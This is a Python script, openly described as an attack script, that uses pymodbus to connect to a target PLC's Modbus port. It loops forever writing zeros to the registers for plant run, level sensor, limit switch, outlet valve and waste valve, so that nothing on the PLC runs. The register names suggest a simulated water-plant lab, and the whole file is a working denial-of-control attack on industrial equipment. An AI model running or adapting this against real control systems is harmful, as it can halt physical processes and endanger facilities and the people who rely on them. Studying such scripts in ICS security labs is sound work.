#!/usr/bin/env python

from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException
import logging

import argparse
import os
import sys
import time

# Override Argument parser to throw error and generate help message
# if undefined args are passed
class MyParser(argparse.ArgumentParser):
    def error(self, message):
        sys.stderr.write('error: %s\n' % message)
        self.print_help()
        sys.exit(2)
        
# Create argparser object to add command line args and help option
parser = MyParser(
	description = 'This attack scripts sets register values so that nothing on the PLC will run',
	epilog = '',
	add_help = True)
	
# Add a "-i" argument to receive a filename
parser.add_argument("-t", action = "store", dest="target",
					help = "Target modbus IP address")

# Print help if no args are supplied
if len(sys.argv)==1:
	parser.print_help()
	sys.exit(1)

# Split and process arguments into "args"
args = parser.parse_args()


logging.basicConfig()
log = logging.getLogger()
log.setLevel(logging.INFO)

#####################################
# Code
#####################################git c
client = ModbusClient(args.target, port=5022)

try:
    client.connect()
    print(". . . Connecting to PLC")
    print(". . . Please wait.")
    time.sleep(3)
    print(". . . Attacking PLC at " + args.target + ":5022")
    time.sleep(1)
    print(". . . Attack successful!")
    print(". . . Jamming all PLC commands!")
    while True:
        rq = client.write_register(0x01, 0) # Run Plant, Run!
        rq = client.write_register(0x02, 0) # Level Sensor
        rq = client.write_register(0x04, 0) # Limit Switch
        rq = client.write_register(0x03, 0) # Outlet valve
        rq = client.write_register(0x08, 0) # Waste valve

except KeyboardInterrupt:
    client.close()
except ConnectionException:
    print("Unable to connect / Connection lost")
